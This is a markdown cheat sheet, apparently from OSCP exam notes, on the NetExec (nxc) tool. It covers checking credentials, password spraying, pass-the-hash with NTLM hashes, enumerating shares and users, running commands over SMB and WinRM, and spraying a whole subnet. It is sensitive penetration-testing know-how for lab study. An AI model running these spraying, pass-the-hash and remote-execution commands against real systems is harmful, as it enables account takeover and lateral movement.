# NetExec (nxc) — Credential Validation & Lateral Movement (OSCP)

NetExec is the **modern successor to CrackMapExec**. The command is `nxc` (not `netexec`).
Use `nxc` over `crackmapexec` on any up-to-date Kali install.

Syntax is nearly identical to CME — just swap `crackmapexec` for `nxc`.

---

## When to Use NetExec

Use nxc **after you have credentials or hashes** to:
- Confirm creds are valid before going further
- Check if creds give admin access
- Spray one password across many users
- Enumerate users and shares
- Pass-the-hash without cracking

---

## Install Check

```bash
nxc --version
```

If not installed:
```bash
sudo apt install netexec -y
```

---

## Core Syntax

```bash
nxc <protocol> <target> [options]
```

Protocols:
- `smb` — Windows file sharing (port 445)
- `winrm` — Windows remote management (port 5985/5986)
- `rdp` — Remote desktop (port 3389)
- `ssh` — Secure shell (port 22)
- `ftp` — File transfer (port 21)
- `ldap` — Active Directory (port 389)

---

## Validate Credentials (Always Do This First)

```bash
nxc smb <IP> -u username -p password
```

Output to look for:
- `[+]` = valid credentials
- `(Pwn3d!)` = you have **local admin** on that machine

Example:
```bash
nxc smb 10.10.10.5 -u administrator -p Password1
```

---

## Password Spraying

Try one password against many users (avoids lockout):
```bash
nxc smb <IP> -u users.txt -p 'Password1'
```

To keep going after first hit (check all users):
```bash
nxc smb <IP> -u users.txt -p 'Password1' --continue-on-success
```

Spray against multiple passwords:
```bash
nxc smb <IP> -u users.txt -p passwords.txt --no-bruteforce
```

`--no-bruteforce` = tries user1:pass1, user2:pass2 (pairs) — NOT every combo.
Without it, it tries every user against every password (full brute force).

---

## Pass-the-Hash (No Cracking Needed)

```bash
nxc smb <IP> -u username -H <NTLM_HASH>
```

Example:
```bash
nxc smb 10.10.10.5 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

Format is `LM:NT` — if you only have the NT hash, use:
```bash
nxc smb 10.10.10.5 -u administrator -H :31d6cfe0d16ae931b73c59d7e0c089c0
```

---

## Enumerate Shares

```bash
nxc smb <IP> -u username -p password --shares
```

---

## Enumerate Users

```bash
nxc smb <IP> -u username -p password --users
```

---

## Run a Command (If Admin)

```bash
nxc smb <IP> -u username -p password -x "whoami"
```

PowerShell:
```bash
nxc smb <IP> -u username -p password -X "whoami"
```

---

## WinRM Access

```bash
nxc winrm <IP> -u username -p password
```

If you see `(Pwn3d!)` → use `evil-winrm` for a full shell.

---

## RDP Access Check

```bash
nxc rdp <IP> -u username -p password
```

---

## Spray Across a Subnet

```bash
nxc smb 10.10.10.0/24 -u username -p password
```

Useful after pivoting into an internal network — test creds against everything.

---

## What Output Means

| Output | Meaning |
|--------|---------|
| `[+]` | Valid credentials |
| `(Pwn3d!)` | Local admin — can run commands |
| `[-]` | Invalid credentials |
| `STATUS_LOGON_FAILURE` | Wrong password |
| `STATUS_ACCOUNT_LOCKED_OUT` | Account locked — stop spraying |

---

## Related Notes

- [[Password_Spraying]]
- [[Impacket]]
- [[Hashcat]]
- [[RDP_and_WinRM]]
- [[SMB]]
